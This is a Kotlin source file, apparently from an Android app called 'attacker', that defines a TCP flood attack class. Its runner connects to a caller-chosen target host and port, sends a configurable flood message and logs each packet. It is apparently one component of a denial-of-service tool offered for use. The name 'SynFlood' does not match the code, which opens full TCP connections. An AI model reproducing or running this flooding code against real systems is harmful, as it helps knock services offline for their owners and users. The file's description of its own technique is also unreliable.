package com.shifthackz.android.attacker.attack.tcp_flood

import com.shifthackz.android.attacker.attack.contract.Attack
import com.shifthackz.android.attacker.attack.contract.AttackParam
import com.shifthackz.android.attacker.attack.contract.AttackType
import com.shifthackz.android.attacker.logging.LogCollector
import org.koin.java.KoinJavaComponent
import java.io.PrintWriter
import java.net.Socket
import java.net.SocketAddress
import java.util.*

class TcpSynFloodAttack(params: Map<AttackParam, Any>) : Attack() {

    private val log: LogCollector by KoinJavaComponent.inject(LogCollector::class.java)

    override val type = AttackType.TCP_FLOOD

    override val runner: () -> Unit = {
        try {
            val socket = Socket(
                "${params[AttackParam.TARGET]}",
                "${params[AttackParam.PORT]}".toInt()
            )
            socket.getOutputStream().write("${params[AttackParam.FLOOD_MSG]}".toByteArray(Charsets.UTF_8))
            log.collectPacketMessage()
            socket.close()
        } catch (e: Exception) {
            log.collectError(e)
        }
    }
}